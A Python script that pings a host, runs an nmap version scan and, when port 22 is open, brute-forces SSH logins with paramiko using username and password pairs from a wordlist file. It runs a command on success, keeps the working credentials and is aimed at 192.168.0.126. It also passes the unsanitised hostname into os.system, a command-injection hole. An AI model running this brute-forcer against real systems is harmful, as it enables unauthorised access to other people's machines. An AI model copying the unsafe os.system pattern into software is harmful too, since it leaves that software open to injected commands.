def compute(hostname):
    import os
    valid = "alive"
    cracked = False
    if (os.system("ping -c 1 -w 1 " + hostname)) == 0:
        print("Host", hostname, "is alive, starting nmap")
        from libnmap.process import NmapProcess
        from libnmap.parser import NmapParser
        nmproc = NmapProcess(hostname, "-sV")
        rc = nmproc.run()
        parsed = NmapParser.parse(nmproc.stdout)
        host = parsed.hosts[0]
        services = []
        status = "Unknown"
        for serv in host.services:
            services.append(str(serv.port) + "/" + str(serv.service))
            print("Open ports:", services)
            if serv.port == 22:
                import paramiko, time
                client = paramiko.client.SSHClient()
                client.load_system_host_keys()
                client.set_missing_host_key_policy(paramiko.WarningPolicy)
                uid_list, pwd_list=[], []
                f = open('wordlists/wordlist_1.txt','r')
                for row in f:
                    split = row.split(" ")
                    uid_list.append(split[0])
                    pwd_list.append(split[1])
                for i, uid in enumerate(uid_list):
                    pwd = pwd_list[i]
                    try:
                        if cracked == False:
                            time.sleep(0.1)
                            try:
                                client.connect(hostname,username=uid,password=pwd)
                                stdin, stdout, stderr = client.exec_command('ls -l')
                                status = "Poor SSH Credentials"
                                print("Successfully connected to host", hostname)
                                cracked = True
                                credentials = [uid, pwd]
                                client.close()
                            except paramiko.AuthenticationException:
                                client.close()
                                print("failed to pwn, reset")
                            except Exception as e:
                                print("failed to pwn,", e)
                    except Exception as e:
                        print("failed to pwn:", e)
    else:
        valid = "dead"
    print(hostname, valid, cracked)
    return hostname, valid, cracked

compute("192.168.0.126")
